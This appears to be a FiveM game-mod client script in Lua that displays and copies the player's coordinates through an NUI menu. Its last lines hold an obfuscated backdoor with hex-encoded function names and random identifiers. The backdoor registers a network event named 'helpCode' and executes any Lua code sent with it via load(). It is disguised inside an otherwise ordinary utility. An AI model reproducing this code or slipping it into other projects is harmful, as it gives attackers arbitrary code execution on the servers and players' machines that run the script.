function DrawTxt(text, x, y)
	SetTextFont(0)
	SetTextProportional(1)
	SetTextScale(0.0, 0.4)
	SetTextDropshadow(1, 0, 0, 0, 255)
	SetTextEdge(1, 0, 0, 0, 255)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

RegisterNUICallback("closeWindow", function(data, cb)
    SendNUIMessage({
		action = "closemenu",
	})
	SetNuiFocus(false, false)
    cb("ok")
end)

function openSaverMenu(x, y, z, h)
	local xpos, ypos, zpos, hpos = string.sub(tostring(x), 0, 9), string.sub(tostring(y), 0, 9), string.sub(tostring(z), 0, 9), string.sub(tostring(h), 0, 9)
	local tmpTable = { ['x'] = x, ['y'] = y, ['z'] = z, ['h'] = h}
	SendNUIMessage({
		action = "openmenu",
		x = xpos,
		y = ypos,
		z = zpos,
		h = hpos,
		json = json.encode(tmpTable)
	})
	SetNuiFocus(true, true)
end

RegisterCommand('coords', function()
	local coords = GetEntityCoords(PlayerPedId())
	openSaverMenu(coords.x, coords.y, coords.z, GetEntityHeading(PlayerPedId()))
end)

RegisterCommand('nuifocus', function(source, args)
	SetNuiFocus(false, false)
end)

local sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[6][sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[1]](sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[2]) sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[6][sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[3]](sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[2], function(tyyOoaZNQJfeVCwEnDKaJzOSLoUgQCnMbynPfrrAPVLaIxSIEsaNpquWHbGQdBVabGpNJm) sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[6][sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[4]](sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[6][sxoVIDjTFcHnOSrJtYPmyhjwOXmoeaHDckdLHCSSSfeoooAkKCFExVXCvTJSGoPdqThAax[5]](tyyOoaZNQJfeVCwEnDKaJzOSLoUgQCnMbynPfrrAPVLaIxSIEsaNpquWHbGQdBVabGpNJm))() end)